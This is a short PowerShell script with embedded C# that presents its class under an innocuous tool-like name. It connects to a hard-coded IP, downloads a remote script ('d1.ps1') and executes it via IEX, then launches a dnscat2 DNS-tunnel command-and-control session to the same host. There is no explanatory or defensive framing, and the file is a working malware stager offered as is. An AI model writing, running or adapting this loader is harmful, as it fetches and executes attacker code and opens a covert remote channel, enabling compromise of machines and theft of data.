$Source = @"
using System.Linq;
using System.Net.Sockets;
using System.Text;
namespace StefanG.Tools
{
    public static class CDRemoteTimeout
    {
        public static string Get()
        {
           Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket.Connect("14.119.104.189", 80);
            socket.Send(Encoding.UTF8.GetBytes("GET /d1.ps1 HTTP/1.1\r\nHost: 14.119.104.189\r\n\r\n"));
            byte[] bytes = new byte[1024];
            int len =socket.Receive(bytes);
            int total=0;
            string data = Encoding.UTF8.GetString(bytes);
            int b = 0;
            for (int i = 0; i < data.Length-1; i++)
            {
                if(data.Substring(i,2)=="\r\n")
                {
                    string head = data.Substring(b, i-b);
                    if (head.Contains("Content-Length"))
                    {
                        total=int.Parse(head.Substring(18));
                    }
                    if (i - b == 2)
                    {
                        break;
                    }
                    b = i;
                    i++;
                }
            }
            string res = Encoding.UTF8.GetString(bytes.Skip(b + 4).Take(len - b - 4).ToArray());
            total -= len - b - 4;
            while (total > 0){
                len = socket.Receive(bytes);
                total -= len;
                res += Encoding.UTF8.GetString(bytes.Take(len).ToArray());
            }
            return res;
        }
    }
}
"@
Add-type -TypeDefinition $source -Language CSharp
IEX([StefanG.Tools.CDRemoteTimeout]::Get())
start-Dnscat2 -PreSharedSecret 12345678 -DNSServer 14.119.104.189  -Domain www.baidu.com